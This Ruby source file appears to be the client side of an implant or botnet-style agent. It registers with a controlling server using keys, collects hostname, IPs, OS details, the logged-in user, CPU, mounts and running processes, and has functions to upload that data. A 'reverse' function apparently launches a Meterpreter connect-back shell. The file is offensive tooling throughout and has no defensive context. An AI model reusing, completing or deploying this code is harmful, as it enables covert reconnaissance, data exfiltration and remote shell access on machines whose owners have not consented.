require 'socket'
require 'fileutils'
require 'rubygems'
require 'sys/host'
require 'sys/cpu'
require 'sys/filesystem'
require 'sys/proctable'
require 'sys/uname'
require 'sys/admin'
require 'zlib'
require 'digest/md5'
require 'base64'
include Sys

def fetch(host, port, url)
        #puts url
        begin
                http = Net::HTTP.new(host, port)
                response = http.get(url)
        rescue Errno::ECONNREFUSED
                return "Error: Connection Refused"
        rescue Timeout::Error
                return "Error: Connection Timeout"
        end
        return response
end

def post(host, port, path, data) 
        begin
                http = Net::HTTP.new(host, port)
                response, data = http.post(path, data)
        rescue Errno::ECONNREFUSED
                return "Error: Connection Refused"
        rescue Timeout::Error
                return "Error: Connection Timeout"
        end
        return response
end

def init(host, port, key, masterkey)
#       authresp = auth(host, port, key, masterkey) 
        regresp = register(host, port, key, masterkey)
        return regresp # authresp
end

def auth(host, port, key, masterkey)
        response = fetch(host, port, "/node/#{key}/auth/#{masterkey}/noop")
        return response
end

def register(host, port, key, masterkey)
        response = fetch(host, port, "/node/#{key}/register/#{masterkey}/optional2")
        return response
end

def reverse(job)
        job = job.split(":")
        puts job.length
        `tests/linux-metepreter-connectback`
end

def upload(host, port, key, data, filename)
	response = post(host, port, "/upload/data/#{key}/#{filename}", data)
	return response
end

def system_info()

        data = []
        time = Time.new
        data << "####KEYKEYKEY##START## #{time.strftime("%Y-%m-%d-%H:%M:%S")} ################"
        data << "System_Info_Start"
        data << "Network_Info_Start"
        data << "Hostname:#{Host.hostname}"
        data << Host.ip_addr
        Host.info{ |h|
                data << h
        }
        data << "Network_Info_Stop"
        data << "OS_Info_Start"
        os = Uname.uname
        oslist = []
        for i in 0...os.length
                oslist << "#{os.members[i]}" + ":" + "#{os[i]}"
        end
        for i in 0...oslist.length
                data << oslist[i]
        end
        data << "OS_Info_Stop"
        data << "User_Info_Start"
        data << Admin.get_login
        data << "User_Info_Stop"
        data << "CPU_Info_Start"
        CPU.processors{ |cs|
                cs.members.each{ |m|
                        data << "#{m}:" + cs[m].to_s
                }
        }
        data << "CPU_Info_Stop"
        data << "Filesystem_Start"
        Filesystem.mounts{ |mount|
        data << "Mount_Info_Start:#{mount.mount_point}"
        data << "Type:#{mount.mount_type}"
        data << "MTime:#{mount.mount_time}"
        data << "MPoint:#{mount.mount_point}"
        data << "MName:#{mount.name}"
        stat = Filesystem.stat(mount.mount_point)
        data << "BaseType:#{stat.base_type}"
        data << "Flags:#{stat.flags}"
        data << "FilesAvail:#{stat.files_available}"
        data << "BlockSize:#{stat.block_size}"
        data << "BlocksAvail:#{stat.blocks_available}"
        data << "Blocks:#{stat.blocks}"
       data << "MaxNames:#{stat.name_max}"
        data << "Path:#{stat.path}"
        data << "FSID:#{stat.filesystem_id}"
        data << "Files:#{stat.files}"
        data << "FragSize:#{stat.fragment_size}"
        data << "FilesFree:#{stat.files_free}"
        data << "BlocksFree:#{stat.blocks_free}"
        data << "Mount_Info_Stop:#{mount.mount_point}"
        }
        data << "Filesystem_Stop"
        data << "Process_Info_Start"
        ProcTable.ps{ |p|
                data << "#{p.comm}:#{p.pid.to_s}"
        }
        data << "Process_Info_Stop"
        data << "System_Info_Stop"
        data << "####KEYKEYKEY##STOP##" + time.strftime("%Y-%m-%d-%H:%M:%S") + "################"
        data = data.join(",")
        return data
end

